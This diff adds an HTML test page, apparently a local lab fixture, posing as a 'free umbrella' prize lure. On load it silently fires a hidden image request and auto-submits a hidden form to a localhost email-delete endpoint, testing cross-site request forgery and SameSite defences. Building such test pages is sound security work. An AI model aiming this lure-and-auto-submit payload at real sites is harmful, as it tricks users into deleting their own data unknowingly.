@@ -1,0 +1,39 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Free Umbrella Promo</title>
+  </head>
+  <body>
+    <h1>You won a free umbrella!</h1>
+    <p>Loading your weather bonus offer...</p>
+    <p>
+      Open this page from <code>http://127.0.0.1.nip.io:5000/weather-promo.html</code>
+      when you want a real cross-site SameSite test against
+      <code>http://localhost:3000</code>.
+    </p>
+
+    <img
+      src="http://localhost:3000/api/emails/delete/1"
+      alt=""
+      style="display: none"
+    />
+
+    <iframe name="csrfSink" style="display: none"></iframe>
+    <form
+      id="csrfTrap"
+      action="http://localhost:3000/api/emails/delete/1"
+      method="POST"
+      target="csrfSink"
+      style="display: none"
+    >
+      <input type="hidden" name="_csrf_token" value="attacker-cannot-guess-this" />
+    </form>
+
+    <script>
+      window.addEventListener("load", () => {
+        document.getElementById("csrfTrap").submit();
+      });
+    </script>
+  </body>
+</html>
